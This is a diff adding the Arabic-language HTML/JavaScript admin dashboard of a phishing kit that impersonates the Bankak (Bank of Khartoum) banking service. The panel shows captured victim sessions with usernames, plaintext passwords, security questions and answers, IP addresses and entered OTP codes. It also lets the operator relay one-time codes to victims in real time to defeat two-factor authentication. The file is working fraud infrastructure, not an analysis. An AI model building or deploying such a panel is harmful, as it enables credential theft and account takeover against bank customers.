@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel | Bankak</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',sans-serif;background:#0f0f0f;color:#e0e0e0;min-height:100vh}
+.login-wrap{display:flex;align-items:center;justify-content:center;height:100vh}
+.login-box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:340px}
+.login-box h2{color:#f5c518;margin-bottom:24px;text-align:center;font-size:20px}
+.inp{width:100%;padding:12px 14px;background:#111;border:1px solid #444;border-radius:8px;color:#fff;font-size:14px;outline:none;margin-bottom:14px}
+.inp:focus{border-color:#f5c518}
+.btn{width:100%;padding:13px;background:#f5c518;border:none;border-radius:8px;color:#111;font-size:15px;font-weight:700;cursor:pointer}
+.btn:hover{background:#d4a818}
+.err{color:#ff5555;font-size:13px;margin-top:8px;text-align:center}
+#dashboard{display:none;padding:20px}
+.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid #333}
+.top-bar h1{color:#f5c518;font-size:18px}
+.btn-sm{padding:8px 16px;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600}
+.btn-danger{background:#c0392b;color:#fff}
+.btn-logout{background:#333;color:#ccc}
+.btn-refresh{background:#2c3e50;color:#fff}
+.stats{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.stat{background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:16px 24px;text-align:center;flex:1;min-width:100px}
+.stat-num{font-size:28px;font-weight:700;color:#f5c518}
+.stat-lbl{font-size:12px;color:#888;margin-top:4px}
+.sessions{display:flex;flex-direction:column;gap:12px}
+.session-card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:10px;padding:16px;transition:border-color .2s}
+.session-card:hover{border-color:#444}
+.s-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
+.s-user{font-size:16px;font-weight:700;color:#fff}
+.s-pass{font-size:13px;color:#aaa;margin-top:2px;direction:ltr}
+.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.b-pending{background:#2c2c00;color:#f5c518}
+.b-security{background:#1a2a1a;color:#4caf50}
+.b-otp_sent{background:#1a1a3a;color:#64b5f6}
+.b-verified{background:#1a3a1a;color:#81c784}
+.b-expired{background:#2a1a1a;color:#e57373}
+.s-body{display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px;margin-bottom:12px}
+.s-row{background:#111;border-radius:6px;padding:8px 10px}
+.s-lbl{color:#888;font-size:11px;margin-bottom:2px}
+.s-val{color:#ddd;word-break:break-all;direction:ltr}
+.s-actions{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.otp-inp{padding:8px 12px;background:#111;border:1px solid #444;border-radius:6px;color:#fff;font-size:16px;font-family:monospace;width:120px;letter-spacing:3px;direction:ltr;outline:none}
+.otp-inp:focus{border-color:#f5c518}
+.btn-otp{padding:8px 16px;background:#1565c0;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600}
+.btn-otp:hover{background:#1976d2}
+.btn-del{padding:8px 12px;background:#2a2a2a;color:#e57373;border:1px solid #3a3a3a;border-radius:6px;cursor:pointer;font-size:12px}
+.btn-del:hover{background:#3a2a2a}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 24px;border-radius:8px;font-size:14px;display:none;z-index:999;border:1px solid #555}
+.empty{text-align:center;color:#555;padding:60px 20px;font-size:15px}
+</style>
+</head>
+<body>
+
+<div class="login-wrap" id="login-page">
+  <div class="login-box">
+    <h2>لوحة تحكم بنكك</h2>
+    <input class="inp" type="password" id="admin-pass" placeholder="كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
+    <button class="btn" onclick="doLogin()">دخول</button>
+    <div class="err" id="login-err"></div>
+  </div>
+</div>
+
+<div id="dashboard">
+  <div class="top-bar">
+    <h1>لوحة تحكم بنكك | Admin</h1>
+    <div style="display:flex;gap:8px">
+      <button class="btn-sm btn-refresh" onclick="loadSessions()">تحديث</button>
+      <button class="btn-sm btn-danger"  onclick="clearAll()">مسح الكل</button>
+      <button class="btn-sm btn-logout"  onclick="doLogout()">خروج</button>
+    </div>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="stat-num" id="st-total">0</div><div class="stat-lbl">إجمالي</div></div>
+    <div class="stat"><div class="stat-num" id="st-pending">0</div><div class="stat-lbl">انتظار</div></div>
+    <div class="stat"><div class="stat-num" id="st-otp">0</div><div class="stat-lbl">OTP أُرسل</div></div>
+    <div class="stat"><div class="stat-num" id="st-done">0</div><div class="stat-lbl">مكتمل</div></div>
+  </div>
+  <div class="sessions" id="sessions-list"></div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ← التغيير الوحيد: كان 'https://bank-of-khartoum.onrender.com'
+const API = '';
+let adminToken = null;
+let autoRefresh = null;
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', 2500);
+}
+
+async function doLogin() {
+  const pass = document.getElementById('admin-pass').value;
+  try {
+    const r = await fetch(`${API}/api/admin/login`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ password: pass })
+    });
+    const d = await r.json();
+    if (d.token) {
+      adminToken = d.token;
+      document.getElementById('login-page').style.display = 'none';
+      document.getElementById('dashboard').style.display  = 'block';
+      loadSessions();
+      autoRefresh = setInterval(loadSessions, 5000);
+    } else {
+      document.getElementById('login-err').textContent = 'كلمة المرور خاطئة';
+    }
+  } catch(e) {
+    document.getElementById('login-err').textContent = 'تعذّر الاتصال';
+  }
+}
+
+async function doLogout() {
+  try {
+    await fetch(`${API}/api/admin/logout`, {
+      method: 'POST',
+      headers: {'x-admin-token': adminToken}
+    });
+  } catch(e) {}
+  clearInterval(autoRefresh);
+  adminToken = null;
+  document.getElementById('dashboard').style.display  = 'none';
+  document.getElementById('login-page').style.display = 'flex';
+  document.getElementById('admin-pass').value = '';
+}
+
+async function loadSessions() {
+  try {
+    const r = await fetch(`${API}/api/admin/sessions`, {
+      headers: {'x-admin-token': adminToken}
+    });
+    const sessions = await r.json();
+    renderSessions(sessions);
+  } catch(e) {}
+}
+
+function statusBadge(s) {
+  const map = {
+    pending:'b-pending',
+    security_done:'b-security',
+    otp_sent:'b-otp_sent',
+    verified:'b-verified',
+    expired:'b-expired'
+  };
+  const labels = {
+    pending:'انتظار',
+    security_done:'أمان ✓',
+    otp_sent:'OTP أُرسل',
+    verified:'مكتمل ✓',
+    expired:'منتهي'
+  };
+  return `<span class="badge ${map[s]||'b-pending'}">${labels[s]||s}</span>`;
+}
+
+function timeAgo(iso) {
+  const diff = Math.floor((Date.now() - new Date(iso)) / 1000);
+  if (diff < 60)   return `${diff}ث`;
+  if (diff < 3600) return `${Math.floor(diff/60)}د`;
+  return `${Math.floor(diff/3600)}س`;
+}
+
+function renderSessions(sessions) {
+  document.getElementById('st-total').textContent   = sessions.length;
+  document.getElementById('st-pending').textContent = sessions.filter(s=>s.status==='pending'||s.status==='security_done').length;
+  document.getElementById('st-otp').textContent     = sessions.filter(s=>s.status==='otp_sent').length;
+  document.getElementById('st-done').textContent    = sessions.filter(s=>s.status==='verified').length;
+
+  const el = document.getElementById('sessions-list');
+  if (!sessions.length) {
+    el.innerHTML = '<div class="empty">لا توجد جلسات بعد</div>';
+    return;
+  }
+  el.innerHTML = sessions.map(s => `
+    <div class="session-card" id="card-${s.id}">
+      <div class="s-head">
+        <div>
+          <div class="s-user">${s.username}</div>
+          <div class="s-pass">كلمة المرور: ${s.password}</div>
+        </div>
+        <div style="text-align:left">
+          ${statusBadge(s.status)}
+          <div style="font-size:11px;color:#666;margin-top:4px">${timeAgo(s.requestTime)}</div>
+        </div>
+      </div>
+      <div class="s-body">
+        ${s.secQuestion ? `
+          <div class="s-row"><div class="s-lbl">سؤال الأمان</div><div class="s-val">${s.secQuestion}</div></div>
+          <div class="s-row"><div class="s-lbl">الإجابة</div><div class="s-val">${s.secAnswer}</div></div>
+        ` : ''}
+        ${s.otp ? `<div class="s-row"><div class="s-lbl">OTP المرسل</div><div class="s-val" style="color:#64b5f6;font-size:18px;letter-spacing:3px">${s.otp}</div></div>` : ''}
+        ${s.enteredOtp ? `<div class="s-row"><div class="s-lbl">OTP المُدخل</div><div class="s-val" style="color:#81c784;font-size:18px;letter-spacing:3px">${s.enteredOtp}</div></div>` : ''}
+        <div class="s-row"><div class="s-lbl">IP</div><div class="s-val">${s.ip}</div></div>
+        <div class="s-row"><div class="s-lbl">الوقت</div><div class="s-val">${new Date(s.requestTime).toLocaleTimeString('ar')}</div></div>
+      </div>
+      <div class="s-actions">
+        <input class="otp-inp" type="text" id="otp-${s.id}" placeholder="OTP" maxlength="6" inputmode="numeric">
+        <button class="btn-otp" onclick="sendOtp('${s.id}')">إرسال OTP</button>
+        <button class="btn-del" onclick="deleteSession('${s.id}')">حذف</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+async function sendOtp(id) {
+  const otp = document.getElementById(`otp-${id}`).value.trim();
+  if (!otp || otp.length < 4) { showToast('أدخل رمز OTP صحيح'); return; }
+  try {
+    await fetch(`${API}/api/admin/send-otp`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json','x-admin-token':adminToken},
+      body: JSON.stringify({ sessionId: id, otp })
+    });
+    showToast(`تم إرسال OTP: ${otp}`);
+    loadSessions();
+  } catch(e) { showToast('خطأ في الإرسال'); }
+}
+
+async function deleteSession(id) {
+  try {
+    await fetch(`${API}/api/admin/sessions/${id}`, {
+      method: 'DELETE',
+      headers: {'x-admin-token': adminToken}
+    });
+    document.getElementById(`card-${id}`)?.remove();
+    showToast('تم الحذف');
+    loadSessions();
+  } catch(e) {}
+}
+
+async function clearAll() {
+  if (!confirm('مسح كل الجلسات؟')) return;
+  try {
+    await fetch(`${API}/api/admin/sessions`, {
+      method: 'DELETE',
+      headers: {'x-admin-token': adminToken}
+    });
+    showToast('تم مسح الكل');
+    loadSessions();
+  } catch(e) {}
+}
+</script>
+</body>
+</html>
